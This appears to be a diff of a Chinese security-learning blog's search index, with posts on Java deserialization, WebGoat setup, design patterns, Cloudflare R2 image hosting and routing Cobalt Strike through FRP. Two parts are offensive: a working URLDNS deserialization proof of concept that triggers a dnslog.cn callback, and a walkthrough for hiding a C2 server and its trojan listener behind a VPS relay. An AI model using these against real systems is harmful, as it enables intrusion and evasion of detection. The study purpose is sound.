-<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;<br>        <br>         <span class="hljs-comment">//思路</span><br>        <span class="hljs-comment">//HashMap&lt;URL, Object&gt; hashMap = new HashMap&lt;&gt;();</span><br>        <span class="hljs-comment">//将hashCOde值改为不是-1，put()的时候就不会发起请求</span><br>        <span class="hljs-comment">//URL url = new URL(&quot;http://jhc0ym.dnslog.cn&quot;);</span><br>       <br>        <span class="hljs-comment">//hashMap.put(url, 1);</span><br>        <span class="hljs-comment">//将hashCode值改为-1</span><br>        <br>        <span class="hljs-comment">//Serialization(hashMap);</span><br>        <br>        <span class="hljs-comment">//实现</span><br>        HashMap&lt;URL, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(); <span class="hljs-comment">//新建一个hashMap</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://jhc0ym.dnslog.cn&quot;</span>);  <span class="hljs-comment">//url</span><br>        <br>        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">URL</span>&gt; c = url.getClass();  <span class="hljs-comment">//获取一个Class</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">hashCodefile</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);  <span class="hljs-comment">//获取hashCode字段</span><br>        hashCodefile.setAccessible(<span class="hljs-literal">true</span>);  <span class="hljs-comment">//设置字段访问权限</span><br>        hashCodefile.set(url, <span class="hljs-number">123</span>);	 <span class="hljs-comment">//将hashCode改为123</span><br><br><br>        hashMap.put(url, <span class="hljs-number">1</span>);<br>        hashCodefile.set(url, -<span class="hljs-number">1</span>);  <span class="hljs-comment">//put完后改为-1</span><br><span class="hljs-comment">//        Serialization(hashMap);</span><br>        Deserialization(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Serialization</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123; <span class="hljs-comment">//序列化</span><br><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        outputStream.writeObject(obj);<br><br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Deserialization</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;  <span class="hljs-comment">//反序列化</span><br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        inputStream.readObject();<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>
-
-
-
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://juejin.cn/post/6844903954774491144#heading-5">为什么hashMap要实现自己的writeObject和readObject方法</a></p>
-<p><a href="https://drun1baby.top/2022/05/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-01-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%A6%82%E5%BF%B5%E4%B8%8E%E5%88%A9%E7%94%A8/#%E5%AE%9E%E6%88%98-%E2%80%94%E2%80%94%E2%80%94%E2%80%94-URLDNS">Java反序列化基础篇-01-反序列化概念与利用</a></p>
-<p><a href="https://www.bilibili.com/video/BV16h411z7o9?p=2&vd_source=d195054a6a081ba07486dcc86c6ba707">Java反序列化漏洞专题-基础篇(21&#x2F;09&#x2F;05更新类加载部分)</a></p>
-]]></content>
-      <categories>
-        <category>JAVA</category>
-      </categories>
-      <tags>
-        <tag>JAVA安全</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>反射</title>
     <url>/2024/05/16/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%B0%84/</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学习Java的反射机制是为了理解Apache Commons Collections中的反序列化漏洞做准备的。</p>
@@ -962,6 +932,85 @@
       </tags>
   </entry>
   <entry>
+    <title>源码部署WebGoat</title>
+    <url>/2024/05/29/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E6%BA%90%E7%A0%81%E9%83%A8%E7%BD%B2Webgoat/</url>
+    <content><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>WebGoat项目地址: <a href="https://github.com/WebGoat/WebGoat">WebGoat</a></p>
+<p>需要JAVA17或者JAVA21，因为Spring boot3最低要求是JAVA17.</p>
+<p><img src="https://image.sp4rks.xyz/2024/06/image-20240529143754756.png" alt="image-20240529143754756"></p>
+<h3 id="下载项目"><a href="#下载项目" class="headerlink" title="下载项目"></a>下载项目</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/WebGoat/WebGoat.git<br></code></pre></td></tr></table></figure>
+
+<h3 id="使用IDEA构建项目"><a href="#使用IDEA构建项目" class="headerlink" title="使用IDEA构建项目"></a>使用IDEA构建项目</h3><p>IDEA自带maven所以我们不需要单独下载</p>
+<p>找到<code>~/WebGoat/pom.xml</code>用idea打开，选择<code>open as peoject</code></p>
+<p><img src="https://image.sp4rks.xyz/2024/06/image-20240529162034060.png" alt="image-20240529162034060"></p>
+<p>IDEA会自动下载maven的依赖，时间比较长。</p>
+<p><img src="https://image.sp4rks.xyz/2024/06/image-20240529163502058.png" alt="image-20240529163502058"></p>
+<p>等插件下载完成，找到目录：<code>src.main.java.org.owasp#webgoat.server.StartWebGoat</code>点击运行，访问 <a href="http://127.0.0.1:8080/WebGoat/">http://127.0.0.1:8080/WebGoat/</a> 和 <a href="http://127.0.0.1:9090/WebWolf/">http://127.0.0.1:9090/WebWolf/</a> 即可</p>
+<p><img src="https://image.sp4rks.xyz/2024/06/image-20240529163537696.png" alt="image-20240529163537696"></p>
+<h2 id="遇到报错"><a href="#遇到报错" class="headerlink" title="遇到报错"></a>遇到报错</h2><p>大概原因是<code>javax.management.InstanceAlreadyExistsException</code> 导致启动失败。因为 JMX（Java Management Extensions）中的 MBean（Managed Bean）已经存在于 MBean 服务器中，导致无法重复注册。</p>
+<p><img src="https://image.sp4rks.xyz/2024/06/image-20240529173118068.png" alt="image-20240529173118068"></p>
+<p>选择禁用JMX端点即可</p>
+<p><img src="https://image.sp4rks.xyz/2024/06/image-20240529173328755.png" alt="image-20240529173328755"></p>
+]]></content>
+      <categories>
+        <category>JAVA</category>
+      </categories>
+      <tags>
+        <tag>JAVA代码审计</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>用FRP实现Cobalt Strike本地上线</title>
+    <url>/2024/07/03/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%88%A9%E7%94%A8FRP%E5%AE%9E%E7%8E%B0cobalt%20strike%E6%9C%AC%E5%9C%B0%E4%B8%8A%E7%BA%BF/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>如果将Cobalt Strike部署在VPS上，长期使用VPS会被标记。另外，大家使用的一般是破解版，不能确保没有后门之类的东西。那可以将CS部署在虚拟机里，利用FRP转发上线。</p>
+<p>比如现在有三个角色：公网服务器：41.24.10.40      CS服务器：192.168.73.98（虚拟机里）      靶机：192.168.112.130(可以访问公网)</p>
+<h2 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h2><p>在公网服务器上frp绑定端口7000</p>
+<p><img src="https://image.sp4rks.xyz/2024/07/image-20240703205441550.png" alt="image-20240703205441550"></p>
+<p>CS服务器的FRP配置</p>
+<p><img src="https://image.sp4rks.xyz/2024/07/image-20240703211315532.png" alt="image-20240703211315532"></p>
+<p>CS生成监听器选择公网服务器的地址</p>
+<p><img src="https://image.sp4rks.xyz/2024/07/image-20240703205751820.png" alt="image-20240703205751820"></p>
+<p>CS服务器是内网机器（<code>192.168.73.98</code>），它运行了一个木马程序，在 <code>6000</code> 端口上监听。但是这台内网机器无法直接从公网访问。</p>
+<p>通过配置这个FRP客户端，它会将本地 <code>192.168.73.98:6000</code> 的TCP流量转发到公网上的FRP服务器 (<code>41.24.10.40:7000</code>)。FRP服务器会将这个流量转发到公网的 <code>6000</code> 端口，因此，外部网络可以通过访问 <code>41.24.10.40:6000</code> 来访问内网中运行的木马程序（或其他服务）。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>看小迪的视频，他的操作是：CS服务器的FRP配置中，本地端口与公网服务器端口不一样，然后用CS生成两个监听器，一个是CS服务器的IP+它本地端口；另一个是远程服务器IP+公网服务器端口，生成木马用远程服务器IP+公网服务器端口这个监听器。他成功了上线了，我死活不成功。我还以为CS问题，防火墙问题，马儿的问题，怀疑各种问题，反正没怀疑他视频。然后从昨天搞到今天，反正不嘻嘻 :r</p>
+]]></content>
+      <categories>
+        <category>内网安全</category>
+      </categories>
+      <tags>
+        <tag>内网安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>创建型-单例模式</title>
+    <url>/2024/05/10/JAVA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/</url>
+    <content><![CDATA[<h2 id="饿汉式"><a href="#饿汉式" class="headerlink" title="饿汉式"></a>饿汉式</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Singleton</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();  <span class="hljs-comment">//用于引用全局唯一的单例对象，在一开始就创建好</span><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span><span class="hljs-params">()</span> &#123;  <span class="hljs-comment">//不允许随便new</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;   <span class="hljs-comment">//获取全局唯一的单例对象</span><br>        <span class="hljs-keyword">return</span> instance;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Singleton</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> Singleton.getInstance();<br>        System.out.println(instance);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="懒汉式"><a href="#懒汉式" class="headerlink" title="懒汉式"></a>懒汉式</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> &#123;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Singleton instance;  <span class="hljs-comment">//在一开始不创建对象</span><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">//如果实例为空就创建</span><br>            instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();<br>        &#125;<br>        <span class="hljs-keyword">return</span> instance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>但是这种方法有种缺陷，由于懒汉式在方法中进行初始化，在多线程的环境下，可能会出现问题。</p>
+<h3 id="懒汉式-改进"><a href="#懒汉式-改进" class="headerlink" title="懒汉式-改进"></a>懒汉式-改进</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Singleton instance;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">synchronized</span> (Singleton.class) &#123;<br>                instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> instance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>但是这种效率比较低，只能又一个线程能进入同步块，其他的必须要等待</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">volatile</span> Singleton instance;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">synchronized</span> (Singleton.class) &#123;<br>                <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) &#123;<br>                    instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();  <span class="hljs-comment">//双重检查</span><br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> instance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>双重检查可以确保在多线程环境下也能保持单例的唯一性，同时尽可能地减少了同步的开销。</p>
+<h3 id="JAVA特有的写法"><a href="#JAVA特有的写法" class="headerlink" title="JAVA特有的写法"></a>JAVA特有的写法</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SingletonHolder</span> &#123;  <span class="hljs-comment">//由静态内部类持有单例对象，根据类加载的特性，仅使用Singleton类时，不会对静态内部类进行初始化</span><br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Singleton</span> <span class="hljs-variable">INSTANCE</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123; <span class="hljs-comment">//只有真正使用内部类时，才会进行类初始化</span><br>        <span class="hljs-keyword">return</span> SingletonHolder.INSTANCE;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在Java中，静态内部类在被使用之前是不会被初始化的，这是由类加载器的工作原理决定的。</p>
+<p>当程序第一次访问静态内部类 <code>SingletonHolder</code> 时，JVM 会加载 <code>SingletonHolder</code> 类。这个加载过程是延迟的，只有在真正需要使用 <code>SingletonHolder</code> 类时才会触发。所以，即使 <code>Singleton</code> 类被加载了，但是不会导致 <code>SingletonHolder</code> 类被加载，也就不会创建单例对象。</p>
+]]></content>
+      <categories>
+        <category>JAVA</category>
+      </categories>
+      <tags>
+        <tag>JAVA设计模式</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>创建型-工厂模式</title>
     <url>/2024/05/03/JAVA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​	为了写出更“优雅”的代码，遂准备来学习JAVA的设计模式。</p>
@@ -1040,200 +1089,6 @@
       </categories>
       <tags>
         <tag>JAVA设计模式</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>源码部署WebGoat</title>
-    <url>/2024/05/29/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E6%BA%90%E7%A0%81%E9%83%A8%E7%BD%B2Webgoat/</url>
-    <content><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>WebGoat项目地址: <a href="https://github.com/WebGoat/WebGoat">WebGoat</a></p>
-<p>需要JAVA17或者JAVA21，因为Spring boot3最低要求是JAVA17.</p>
-<p><img src="https://image.sp4rks.xyz/2024/06/image-20240529143754756.png" alt="image-20240529143754756"></p>
-<h3 id="下载项目"><a href="#下载项目" class="headerlink" title="下载项目"></a>下载项目</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/WebGoat/WebGoat.git<br></code></pre></td></tr></table></figure>
-
-<h3 id="使用IDEA构建项目"><a href="#使用IDEA构建项目" class="headerlink" title="使用IDEA构建项目"></a>使用IDEA构建项目</h3><p>IDEA自带maven所以我们不需要单独下载</p>
-<p>找到<code>~/WebGoat/pom.xml</code>用idea打开，选择<code>open as peoject</code></p>
-<p><img src="https://image.sp4rks.xyz/2024/06/image-20240529162034060.png" alt="image-20240529162034060"></p>
-<p>IDEA会自动下载maven的依赖，时间比较长。</p>
-<p><img src="https://image.sp4rks.xyz/2024/06/image-20240529163502058.png" alt="image-20240529163502058"></p>
-<p>等插件下载完成，找到目录：<code>src.main.java.org.owasp#webgoat.server.StartWebGoat</code>点击运行，访问 <a href="http://127.0.0.1:8080/WebGoat/">http://127.0.0.1:8080/WebGoat/</a> 和 <a href="http://127.0.0.1:9090/WebWolf/">http://127.0.0.1:9090/WebWolf/</a> 即可</p>
-<p><img src="https://image.sp4rks.xyz/2024/06/image-20240529163537696.png" alt="image-20240529163537696"></p>
-<h2 id="遇到报错"><a href="#遇到报错" class="headerlink" title="遇到报错"></a>遇到报错</h2><p>大概原因是<code>javax.management.InstanceAlreadyExistsException</code> 导致启动失败。因为 JMX（Java Management Extensions）中的 MBean（Managed Bean）已经存在于 MBean 服务器中，导致无法重复注册。</p>
-<p><img src="https://image.sp4rks.xyz/2024/06/image-20240529173118068.png" alt="image-20240529173118068"></p>
-<p>选择禁用JMX端点即可</p>
-<p><img src="https://image.sp4rks.xyz/2024/06/image-20240529173328755.png" alt="image-20240529173328755"></p>
-]]></content>
-      <categories>
-        <category>JAVA</category>
-      </categories>
-      <tags>
-        <tag>JAVA代码审计</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>用FRP实现Cobalt Strike本地上线</title>
-    <url>/2024/07/03/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%88%A9%E7%94%A8FRP%E5%AE%9E%E7%8E%B0cobalt%20strike%E6%9C%AC%E5%9C%B0%E4%B8%8A%E7%BA%BF/</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>如果将Cobalt Strike部署在VPS上，长期使用VPS会被标记。另外，大家使用的一般是破解版，不能确保没有后门之类的东西。那可以将CS部署在虚拟机里，利用FRP转发上线。</p>
-<p>比如现在有三个角色：公网服务器：41.24.10.40      CS服务器：192.168.73.98（虚拟机里）      靶机：192.168.112.130(可以访问公网)</p>
-<h2 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h2><p>在公网服务器上frp绑定端口7000</p>
-<p><img src="https://image.sp4rks.xyz/2024/07/image-20240703205441550.png" alt="image-20240703205441550"></p>
-<p>CS服务器的FRP配置</p>
-<p><img src="https://image.sp4rks.xyz/2024/07/image-20240703211315532.png" alt="image-20240703211315532"></p>
-<p>CS生成监听器选择公网服务器的地址</p>
-<p><img src="https://image.sp4rks.xyz/2024/07/image-20240703205751820.png" alt="image-20240703205751820"></p>
-<p>CS服务器是内网机器（<code>192.168.73.98</code>），它运行了一个木马程序，在 <code>6000</code> 端口上监听。但是这台内网机器无法直接从公网访问。</p>
-<p>通过配置这个FRP客户端，它会将本地 <code>192.168.73.98:6000</code> 的TCP流量转发到公网上的FRP服务器 (<code>41.24.10.40:7000</code>)。FRP服务器会将这个流量转发到公网的 <code>6000</code> 端口，因此，外部网络可以通过访问 <code>41.24.10.40:6000</code> 来访问内网中运行的木马程序（或其他服务）。</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>看小迪的视频，他的操作是：CS服务器的FRP配置中，本地端口与公网服务器端口不一样，然后用CS生成两个监听器，一个是CS服务器的IP+它本地端口；另一个是远程服务器IP+公网服务器端口，生成木马用远程服务器IP+公网服务器端口这个监听器。他成功了上线了，我死活不成功。我还以为CS问题，防火墙问题，马儿的问题，怀疑各种问题，反正没怀疑他视频。然后从昨天搞到今天，反正不嘻嘻 :r</p>
-]]></content>
-      <categories>
-        <category>内网安全</category>
-      </categories>
-      <tags>
-        <tag>内网安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>利用Cloudflare R2搭建图床</title>
-    <url>/2024/06/28/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/%E5%88%A9%E7%94%A8Cloudflare%20R2%E6%90%AD%E5%BB%BA%E5%9B%BE%E5%BA%8A/</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前博客都是通过GitHub实现图床的，但是国内访问图片的速度实在是不敢恭维；另外GitHub其实是不允许做图床的，当库超过1G以后会有人工审查，发现是图床可能会删库，甚至封帐号；</p>
-<h2 id="前期解决方案"><a href="#前期解决方案" class="headerlink" title="前期解决方案"></a>前期解决方案</h2><p>总体来看有几个解决方法</p>
-<p>阿里云oss	腾讯云cos	七牛云	又拍云</p>
-<p>七牛云有免费的额度，也可以使用不备案的域名，但是这样的话图片速度比Github还慢</p>
-<p>又拍云需要网站备案，加入又拍云联盟才有免费额度，又拍云联盟需要在你的网站上加上他们的广告和需要手持证件照拍照审核</p>
-<p>综上，前期我用的第一个解决方案是腾讯云的cos桶，类似的还有阿里云的oss，价格其实也不贵</p>
-<p>但是当我部署完了，去浏览器打开图片连接发现，浏览器会自动下载图片，不能预览，翻了半天cos介绍才知道，域名没备案的不支持预览，浏览器打开连接就直接下载了。用了一段时间，虽然没啥大问题，但是总感觉不爽。</p>
-<p>总体来说上面的方案都需要备案才能有良好的使用体验。</p>
-<p>于是最后转向了<strong>Cloudflare</strong>的怀抱</p>
-<p>优势是：</p>
-<p>网站不需要备案，有免费额度</p>
-<p>图片响应速度快</p>
-<p><strong>R2 定价</strong></p>
-<table>
-<thead>
-<tr>
-<th>ㅤ</th>
-<th>免费</th>
-<th>超出部分&#x2F;月费</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>存储</td>
-<td>10 GB&#x2F;月</td>
-<td>0.015 美元&#x2F;GB</td>
-</tr>
-<tr>
-<td>A 类操作</td>
-<td>100 万次&#x2F;月</td>
-<td>4.50 美元&#x2F;百万次</td>
-</tr>
-<tr>
-<td>B 类操作</td>
-<td>1000 万次&#x2F;月</td>
-<td>0.36 美元&#x2F;百万次</td>
-</tr>
-</tbody></table>
-<h2 id="使用Cloudflare-R2的前期准备"><a href="#使用Cloudflare-R2的前期准备" class="headerlink" title="使用Cloudflare R2的前期准备"></a>使用Cloudflare R2的前期准备</h2><p><a href="https://github.com/Kuingsmile/PicList">PicList</a></p>
-<p><a href="https://www.paypal.com/">paypal</a></p>
-<p>域名(可不备案)</p>
-<hr>
-<p>首先需要把你的域名添加到<strong>Cloudflare</strong></p>
-<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628145013147.png" alt="image-20240628145013147"></p>
-<p>选择免费的计划就行，随后会分配两个dns服务器</p>
-<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628145259856.png" alt="image-20240628145259856"></p>
-<p>直接去域名的服务商那里改成这<strong>Cloudflare</strong>的DNS地址</p>
-<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628145524103.png" alt="image-20240628145524103"></p>
-<p>另外使用CF之后发现，网站加载速度很慢。把A记录和CNAME设置为仅DNS就行</p>
-<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628151002609.png" alt="image-20240628151002609"></p>
-<h2 id="第一个坑点"><a href="#第一个坑点" class="headerlink" title="第一个坑点"></a>第一个坑点</h2><p>其实之前很早就注册<strong>Cloudflare</strong>了，上去看了一下，有很多自己不是很了解的东西，就留在温柔乡了。。。继续使用cos桶；另一个问题是之前听过创建R2存储用paypal就行，但是我上去看必须要信用卡，遂放弃。</p>
-<p>偶然发现是梯子的问题</p>
-<p>个人习惯梯子开机自启，习惯谷歌，杜绝百度</p>
-<p>可以看到并没有出现paypal的选项</p>
-<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628144516183.png" alt="image-20240628144516183"></p>
-<p>不开梯子就可以使用paypal付款了</p>
-<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628144701802.png" alt="image-20240628144701802"></p>
-<h2 id="创建存储桶"><a href="#创建存储桶" class="headerlink" title="创建存储桶"></a>创建存储桶</h2><p>位置选择 亚太地区</p>
-<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628151346032.png" alt="image-20240628151346032"></p>
-<p>R2创建完之后，设置连接域名，输入刚刚添加的域名的三级域名，比如 a.com 写为image.a.com，<strong>Cloudflare</strong>会自动添加记录，用这个域名就可以访问R2存储的内容</p>
-<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628151514382.png" alt="image-20240628151514382"></p>
-<p>接着添加一个管理令牌</p>
-<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628151750145.png" alt="image-20240628151750145"></p>
-<p>剩下的默认即可</p>
-<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628151925647.png" alt="image-20240628151925647"></p>
-<h2 id="PicList不能同步闪出云端图片的解决方案"><a href="#PicList不能同步闪出云端图片的解决方案" class="headerlink" title="PicList不能同步闪出云端图片的解决方案"></a>PicList不能同步闪出云端图片的解决方案</h2><p>严格按照如图所示位置填写</p>
-<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628152607640.png" alt="image-20240628152607640"></p>
-<p>上传路径可以根据表自己组合填写</p>
-<table>
-<thead>
-<tr>
-<th align="center">payload</th>
-<th align="center">描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center"><code>&#123;year&#125;</code></td>
-<td align="center">当前日期 - 年</td>
-</tr>
-<tr>
-<td align="center"><code>&#123;month&#125;</code></td>
-<td align="center">当前日期 - 月</td>
-</tr>
-<tr>
-<td align="center"><code>&#123;day&#125;</code></td>
-<td align="center">当前日期 - 日</td>
-</tr>
-<tr>
-<td align="center"><code>&#123;fullName&#125;</code></td>
-<td align="center">完整文件名（含扩展名）</td>
-</tr>
-<tr>
-<td align="center"><code>&#123;fileName&#125;</code></td>
-<td align="center">文件名（不含扩展名）</td>
-</tr>
-<tr>
-<td align="center"><code>&#123;extName&#125;</code></td>
-<td align="center">扩展名（不含.）</td>
-</tr>
-<tr>
-<td align="center"><code>&#123;md5&#125;</code></td>
-<td align="center">图片 MD5 计算值</td>
-</tr>
-<tr>
-<td align="center"><code>&#123;sha1&#125;</code></td>
-<td align="center">图片 SHA1 计算值</td>
-</tr>
-<tr>
-<td align="center"><code>&#123;sha256&#125;</code></td>
-<td align="center">图片 SHA256 计算值</td>
-</tr>
-<tr>
-<td align="center"><code>&#123;timestamp&#125;</code></td>
-<td align="center">Unix 时间戳</td>
-</tr>
-<tr>
-<td align="center"><code>&#123;timestampMS&#125;</code></td>
-<td align="center">Unix 时间戳（毫秒）</td>
-</tr>
-</tbody></table>
